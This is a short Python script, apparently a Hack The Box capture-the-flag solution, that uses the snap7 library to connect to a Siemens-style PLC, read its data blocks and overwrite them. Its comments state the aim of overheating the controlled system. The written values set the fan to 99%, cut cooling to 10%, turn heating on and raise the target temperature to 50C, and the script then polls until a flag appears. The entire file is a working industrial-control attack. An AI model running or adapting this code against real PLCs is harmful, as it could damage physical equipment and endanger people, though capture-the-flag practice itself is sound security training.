# 5 databases
# 50 or 100 bytes
# overheat:
#   set fan speed to 99%
#   reduce cooling to 10%
#   turn the heat on
#   set target temp to 50 degree C
import snap7
client = snap7.client.Client()
client.connect("94.237.122.124", 0, 0, 58108)

#client.get_connected():
#data = client.db_read(1, 0, 4)
#client.db_write(1, 0, data)
#client.disconnect()

data = bytearray()
min_size = 50
max_size = 100

print('current data:')
print(client.db_read(1, 0, 50))
print(client.db_read(2, 0, 50))
print(client.db_read(3, 0, 50))
print(client.db_read(4, 0, 100))
print(client.db_read(5, 0, 50))
print()

print('writing data...')
print()
data_1 = b'TARGET-TEMP:50C SETPOINT:22C MAX:50C MIN:10C \x00\x00\x00\x00\x00'
data_2 = b'FAN:99% VENT:RECIRC AIR:1000m3/h STAT:ON \x00\x00\x00\x00\x00\x00\x00\x00\x00'
data_3 = b'COMP:ON COOL:10% PRES:5bar \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
data_5 = b'HEAT:ON  CAP:0% OVR:0 KEY:0a42417865 \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
client.db_write(2, 0, data_2)
client.db_write(3, 0, data_3)
client.db_write(5, 0, data_5)
client.db_write(1, 0, data_1)

print('manipulated data:')
print(client.db_read(1, 0, 50))
print(client.db_read(2, 0, 50))
print(client.db_read(3, 0, 50))
print(client.db_read(5, 0, 50))

print('checking for flag...')
flag = ''
while 'HTB' not in flag:
    flag = client.db_read(4, 0, 100).decode('utf-8')
print('found flag!')
print(client.db_read(4, 0, 100))

client.disconnect()
